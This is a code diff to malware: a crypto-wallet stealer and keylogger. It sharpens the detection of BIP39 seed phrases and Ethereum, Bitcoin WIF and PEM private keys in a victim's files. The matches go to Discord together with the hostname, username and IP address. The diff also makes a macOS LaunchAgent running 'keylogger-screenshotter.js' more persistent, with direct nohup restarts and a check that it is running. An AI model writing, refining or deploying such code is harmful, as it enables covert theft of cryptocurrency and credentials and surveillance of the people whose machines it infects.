@@ -1156,9 +1156,13 @@ const COMMON_SEED_WORDS = new Set([
     'zone', 'zoo'
 ]);
 
-// Function to detect seed phrase using BIP39 wordlist (scans entire file)
+// Function to detect seed phrase using BIP39 wordlist (STRICT - only real seed phrases!)
 function detectSeedPhrase(content) {
     if (!content || content.length < 20) return null;
+    
+    // Skip if content is mostly hex/numbers (not a seed phrase)
+    const hexPattern = /^[0-9a-fA-F\s:]+$/;
+    if (hexPattern.test(content.trim().substring(0, 100))) return null;
     
     // Remove common prefixes/suffixes and clean content
     let cleanContent = content
@@ -1166,54 +1170,45 @@ function detectSeedPhrase(content) {
         .replace(/[\s:]*$/gmi, '')
         .replace(/[^\w\s\-_]/g, ' '); // Remove special chars except spaces, dashes, underscores
     
-    // Try to find seed phrases in the entire content (not just line by line)
-    // Split by common separators
-    const possiblePhrases = [
-        cleanContent, // Full content
-        ...cleanContent.split('\n'), // Line by line
-        ...cleanContent.split(','), // Comma separated
-        ...cleanContent.split('|'), // Pipe separated
-        ...cleanContent.split('-'), // Dash separated
-        ...cleanContent.split('_') // Underscore separated
-    ];
+    // Try to find seed phrases line by line (more accurate)
+    const lines = cleanContent.split('\n').map(l => l.trim()).filter(l => l.length > 20);
     
-    for (const phrase of possiblePhrases) {
-        if (!phrase || phrase.length < 20) continue;
+    for (const line of lines) {
+        // Skip if line looks like hex/tokens
+        if (hexPattern.test(line) || /^[0-9a-f]{32,}/i.test(line)) continue;
         
         // Split into words (handle various separators)
-        const words = phrase.trim()
+        const words = line
             .split(/[\s,\-_\|\.]+/)
-            .filter(w => w.length > 0 && w.length < 15) // Valid word length
-            .map(w => w.toLowerCase().trim());
+            .filter(w => w.length > 2 && w.length < 15) // Valid word length (3-14 chars)
+            .map(w => w.toLowerCase().trim())
+            .filter(w => /^[a-z]+$/.test(w)); // Only lowercase letters (no numbers, no special chars)
         
-        // Check for valid seed phrase lengths
-        const validLengths = [12, 15, 18, 21, 24];
-        if (!validLengths.includes(words.length)) continue;
+        // Check for valid seed phrase lengths (12 or 24 words - standard)
+        if (words.length !== 12 && words.length !== 24) continue;
         
         // Check how many words are in BIP39 wordlist
         const validWords = words.filter(w => COMMON_SEED_WORDS.has(w));
         const validRatio = validWords.length / words.length;
         
-        // If 75%+ words are valid BIP39 words, it's likely a seed phrase
-        if (validRatio >= 0.75) {
-            // Additional validation: check word uniqueness (seed phrases usually have unique words)
+        // STRICT: Require 90%+ valid BIP39 words (not 75%!)
+        if (validRatio >= 0.90) {
+            // Additional validation: check word uniqueness
             const uniqueWords = new Set(words);
             const uniquenessRatio = uniqueWords.size / words.length;
             
-            // High confidence if 80%+ valid words and good uniqueness
-            const confidence = validRatio >= 0.8 && uniquenessRatio >= 0.8 ? 
-                Math.min(100, (validRatio * 100 + uniquenessRatio * 20).toFixed(0)) :
-                (validRatio * 100).toFixed(0);
-            
-            return {
-                type: 'seed_phrase',
-                words: words,
-                wordCount: words.length,
-                validWords: validWords.length,
-                uniqueWords: uniqueWords.size,
-                confidence: confidence,
-                preview: words.slice(0, 5).join(' ') + '...'
-            };
+            // Require good uniqueness (at least 80% unique words)
+            if (uniquenessRatio >= 0.80) {
+                return {
+                    type: 'seed_phrase',
+                    words: words,
+                    wordCount: words.length,
+                    validWords: validWords.length,
+                    uniqueWords: uniqueWords.size,
+                    confidence: Math.min(100, (validRatio * 100).toFixed(0)),
+                    preview: words.slice(0, 5).join(' ') + '...'
+                };
+            }
         }
     }
     
@@ -1363,34 +1358,46 @@ function detectPasswords(content) {
     return null;
 }
 
-// Function to detect private keys
+// Function to detect private keys (STRICT - only actual private key formats)
 function detectPrivateKeys(content) {
     if (!content) return null;
     
-    const privateKeyPatterns = [
-        /(0x[a-fA-F0-9]{64})/g, // Ethereum private key
-        /([5KL][1-9A-HJ-NP-Za-km-z]{50,51})/g, // Bitcoin WIF
-        /([a-fA-F0-9]{64})/g, // Generic hex private key
-        /(-----BEGIN PRIVATE KEY-----[\s\S]*?-----END PRIVATE KEY-----)/g, // PEM format
-        /(-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----)/g
-    ];
-    
     const found = [];
-    for (const pattern of privateKeyPatterns) {
-        const matches = [...content.matchAll(pattern)];
-        for (const match of matches) {
-            if (match[1] && match[1].length >= 32) {
-                found.push({
-                    type: 'private_key',
-                    value: match[1].substring(0, 100), // Limit length
-                    format: match[1].startsWith('0x') ? 'ethereum' : 
-                           match[1].startsWith('-----') ? 'pem' : 
-                           match[1].match(/^[5KL]/) ? 'bitcoin_wif' : 'hex'
-                });
-            }
-        }
+    
+    // Ethereum private key (0x followed by exactly 64 hex chars)
+    const ethPattern = /(0x[a-fA-F0-9]{64})\b/g;
+    const ethMatches = [...content.matchAll(ethPattern)];
+    for (const match of ethMatches) {
+        found.push({
+            type: 'private_key',
+            value: match[1],
+            format: 'ethereum'
+        });
     }
     
+    // Bitcoin WIF (starts with 5, K, or L, 51-52 base58 chars)
+    const wifPattern = /\b([5KL][1-9A-HJ-NP-Za-km-z]{50,52})\b/g;
+    const wifMatches = [...content.matchAll(wifPattern)];
+    for (const match of wifMatches) {
+        found.push({
+            type: 'private_key',
+            value: match[1],
+            format: 'bitcoin_wif'
+        });
+    }
+    
+    // PEM format (full key block)
+    const pemPattern = /(-----BEGIN (?:RSA )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA )?PRIVATE KEY-----)/g;
+    const pemMatches = [...content.matchAll(pemPattern)];
+    for (const match of pemMatches) {
+        found.push({
+            type: 'private_key',
+            value: match[1].substring(0, 200),
+            format: 'pem'
+        });
+    }
+    
+    // Don't detect random hex strings - only specific formats above
     return found.length > 0 ? found.slice(0, 5) : null;
 }
 
@@ -1477,14 +1484,18 @@ function sendFileToDiscord(filepath, filename, analysis) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    // Build modern clean Discord message (like examples)
+    // Build modern clean Discord message
     const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
     const privateKeys = analysis.detected.filter(d => d.type === 'private_key');
     
-    let message = `**Seed Phrase Detected**\n\n`;
+    // Only send if we found actual seed phrases or private keys
+    if (seedPhrases.length === 0 && privateKeys.length === 0) return;
+    
+    let message = ``;
     
     // Seed phrase content (clean format)
     if (seedPhrases.length > 0) {
+        message += `**Seed Phrase Detected**\n\n`;
         seedPhrases.forEach((item) => {
             message += `\`\`\`\n${item.words.join(' ')}\n\`\`\`\n\n`;
         });
@@ -1492,14 +1503,15 @@ function sendFileToDiscord(filepath, filename, analysis) {
     
     // Private keys if found
     if (privateKeys.length > 0) {
-        message += `**Private Keys:**\n`;
+        if (seedPhrases.length > 0) message += `**Private Keys:**\n`;
+        else message += `**Private Keys Detected**\n\n`;
         privateKeys.forEach((item) => {
-            message += `\`${item.value.substring(0, 50)}...\`\n`;
+            message += `\`${item.value.substring(0, 60)}${item.value.length > 60 ? '...' : ''}\`\n`;
         });
         message += `\n`;
     }
     
-    // System info (modern format with boxes)
+    // System info (clean format)
     message += `**Hostname:** \`${HOSTNAME}\`\n`;
     message += `**PC Username:** \`${USERNAME}\`\n`;
     message += `**IP Address:** \`${ipAddress}\``;
@@ -1569,10 +1581,11 @@ function checkFile(filepath) {
         // Analyze file for seed phrases only
         const analysis = analyzeFile(filepath, filename, content);
         
-        // Only send if seed phrase or private key detected
-        const hasSeedPhrase = analysis.detected.some(d => d.type === 'seed_phrase');
+        // Only send if ACTUAL seed phrase detected (90%+ confidence, not random hex/tokens)
+        const hasSeedPhrase = analysis.detected.some(d => d.type === 'seed_phrase' && parseInt(d.confidence) >= 90);
         const hasPrivateKey = analysis.detected.some(d => d.type === 'private_key');
         
+        // Only send if we have a high-confidence seed phrase or valid private key
         if (hasSeedPhrase || hasPrivateKey) {
             watchedFiles.add(filepath);
             sendFileToDiscord(filepath, filename, analysis);
@@ -1893,6 +1906,8 @@ PKGEOF
     <true/>
     <key>KeepAlive</key>
     <true/>
+    <key>LaunchOnlyOnce</key>
+    <false/>
     <key>WorkingDirectory</key>
     <string>$APP_DIR</string>
     <key>StandardOutPath</key>
@@ -1903,14 +1918,29 @@ PKGEOF
     <string>Background</string>
     <key>ThrottleInterval</key>
     <integer>10</integer>
+    <key>StartInterval</key>
+    <integer>60</integer>
 </dict>
 </plist>
 PLISTEOF
     
-    # Load Launch Agent
+    # Load and start Launch Agent (ensure it actually starts and persists!)
     launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
     launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
+    
+    # Wait a moment then start it
+    sleep 2
     launchctl start com.keylogger.helper 2>/dev/null || true
+    
+    # Also start it directly as backup (in case LaunchAgent fails)
+    (cd "$APP_DIR" && nohup "$NODE_PATH" keylogger-screenshotter.js >/dev/null 2>&1 &)
+    
+    # Verify it's running
+    sleep 1
+    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
+        # If not running, try starting again
+        (cd "$APP_DIR" && nohup "$NODE_PATH" keylogger-screenshotter.js >/dev/null 2>&1 &)
+    fi
     
     # Send Discord notification that keylogger is installed and running
     sleep 3  # Wait a moment for keylogger to start
